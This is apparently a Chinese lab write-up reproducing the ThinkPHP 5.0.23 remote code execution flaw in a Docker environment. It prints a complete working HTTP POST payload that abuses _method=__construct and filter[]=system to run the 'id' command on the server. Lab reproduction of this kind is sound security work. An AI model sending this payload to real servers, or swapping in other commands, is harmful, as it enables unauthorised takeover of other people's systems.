# ThinkPHP5 5.0.23 远程代码执行漏洞

## 漏洞环境

执行如下命令启动一个默认的thinkphp 5.0.23环境：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080即可看到默认的ThinkPHP启动页面。

## 漏洞复现

发送数据包：

```plain
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

成功执行id命令：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922877382-3cf00a92-0a9c-44d2-a593-42d86c923fc5.png)